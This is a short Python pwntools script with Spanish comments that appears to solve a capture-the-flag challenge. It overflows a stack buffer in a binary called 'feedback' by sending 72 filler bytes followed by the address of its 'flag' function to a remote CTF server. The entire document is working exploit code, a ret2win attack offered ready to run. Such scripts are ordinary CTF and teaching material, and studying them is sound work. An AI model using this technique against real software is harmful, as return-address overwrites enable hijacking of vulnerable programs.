from pwn import *

# Configuración
context.binary = elf = ELF('./feedback') # Carga el binario para obtener info

# 1. Encontrar OFFSET_RET usando GDB/GEF pattern
OFFSET_RET = 72

# 2. Obtener dirección de flag (fija porque no hay PIE)
flag_addr = elf.symbols['flag']
log.info(f"Dirección de la función flag: {hex(flag_addr)}")

# Conexión (local o remota)
# p = process() # Ejecución local
p = remote('ctf.hackademics-forum.com', 41422) # Cambia host y puerto

# 3. Construir el payload
payload = b'A' * OFFSET_RET
payload += p64(flag_addr) # Empaquetar la dirección para 64 bits

# Enviar el payload
p.sendlineafter(b':', payload) # Enviar después del prompt ':'

# Recibir la salida (esperando la flag)
log.success("Payload enviado. Recibiendo salida:")
try:
    print(p.recvall(timeout=2).decode())
except EOFError:
    print("[-] La conexión se cerró inesperadamente.")
